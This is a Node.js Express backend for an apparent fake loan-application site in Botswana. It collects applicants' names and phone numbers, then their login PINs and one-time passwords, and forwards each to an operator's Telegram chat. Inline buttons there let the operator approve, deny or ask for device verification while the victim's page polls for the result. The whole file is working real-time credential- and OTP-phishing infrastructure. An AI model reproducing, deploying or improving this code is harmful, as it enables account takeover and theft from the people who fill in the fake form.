require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
if (!TELEGRAM_BOT_TOKEN) console.warn('⚠️ TELEGRAM_BOT_TOKEN not set in environment');

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// In-memory sessions store. For production use persistent storage.
const sessions = new Map();

function buildMessage(stage, data) {
  if (stage === 'page2') {
    return `🟠 NEW LOAN APPLICATION\n\nLoan Amount: P ${data.loanAmount}\nName: ${data.firstName} ${data.lastName}\nPhone: ${data.phoneNumber}\nPurpose: ${data.loanPurpose}\n\nStatus: PENDING APPLICATION DETAILS REVIEW`;
  }

  if (stage === 'page3') {
    return `🔐 LOGIN VERIFICATION\n\nPhone: ${data.loginPhone}\nPIN: ${data.loginPin}\n\nStatus: AWAITING LOGIN VERIFICATION`;
  }

  if (stage === 'page5') {
    return `📱 OTP VERIFICATION\n\nPhone: ${data.loginPhone}\nOTP Entered: ${data.otp}\n\nStatus: AWAITING OTP VERIFICATION`;
  }

  return 'New update';
}

function buildKeyboard(stage, sessionId) {
  // Each callback_data includes the sessionId so the webhook can map actions back to frontend sessions
  if (stage === 'page2') {
    return [
      [
        { text: '✅ APPROVED', callback_data: `app_approved__${sessionId}` },
        { text: '❌ DENY', callback_data: `app_deny__${sessionId}` }
      ]
    ];
  }

  if (stage === 'page3') {
    return [
      [
        { text: '✅ APPROVED', callback_data: `login_approved__${sessionId}` },
        { text: '⚠️ VERIFY DEVICE', callback_data: `login_verify_device__${sessionId}` }
      ],
      [
        { text: '❌ DENY', callback_data: `login_deny__${sessionId}` }
      ]
    ];
  }

  if (stage === 'page5') {
    return [
      [
        { text: '✅ APPROVE', callback_data: `otp_approve__${sessionId}` },
        { text: '❌ WRONG OTP', callback_data: `otp_wrong__${sessionId}` }
      ]
    ];
  }

  return [];
}

app.post('/api/start-stage', async (req, res) => {
  const { stage, data, chat_id } = req.body;
  if (!stage) return res.status(400).json({ error: 'stage required' });

  const sessionId = uuidv4();
  sessions.set(sessionId, { stage, status: 'pending', data: data || null, lastAction: null, updatedAt: new Date().toISOString() });

  const text = buildMessage(stage, data || {});
  const keyboard = buildKeyboard(stage, sessionId);
  const chatId = chat_id || TELEGRAM_CHAT_ID;

  try {
    await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: keyboard }
    });

    return res.json({ sessionId });
  } catch (err) {
    console.error('Error sending message to Telegram:', err?.response?.data || err.message || err);
    return res.status(500).json({ error: 'Error sending message to Telegram' });
  }
});

// Telegram webhook endpoint - configure Telegram to POST updates here
app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;

  // Handle inline button presses (callback_query)
  if (update && update.callback_query) {
    const cb = update.callback_query;
    const raw = cb.data || '';
    const parts = raw.split('__');
    const action = parts[0] || raw;
    const sessionId = parts[1];

    if (sessionId && sessions.has(sessionId)) {
      const session = sessions.get(sessionId);
      // Map action to status
      if (action.includes('approved') || action.includes('approve')) {
        session.status = 'approved';
      } else if (action.includes('deny') || action.includes('deny')) {
        session.status = 'denied';
      } else if (action.includes('verify')) {
        session.status = 'verify_device';
      }
      session.lastAction = action;
      session.updatedAt = new Date().toISOString();
      sessions.set(sessionId, session);
    }

    // Answer callback so Telegram client doesn't show loading
    try {
      await axios.post(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
        callback_query_id: cb.id,
        text: 'Action received',
        show_alert: false
      });
    } catch (e) {
      console.warn('Failed to answer callback query:', e?.response?.data || e.message || e);
    }

    // Optionally send a confirmation message to the chat
    try {
      if (update.callback_query && update.callback_query.message) {
        const chatId = update.callback_query.message.chat.id;
        await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
          chat_id: chatId,
          text: `Received action: ${raw}`
        });
      }
    } catch (e) {
      // ignore
    }

    return res.sendStatus(200);
  }

  // Other update types are ignored for now
  res.sendStatus(200);
});

app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  if (!sessions.has(sessionId)) return res.status(404).json({ error: 'session not found' });
  const s = sessions.get(sessionId);
  return res.json({ stage: s.stage, status: s.status, lastAction: s.lastAction, updatedAt: s.updatedAt });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`botswana-loan-app backend listening on ${port}`));
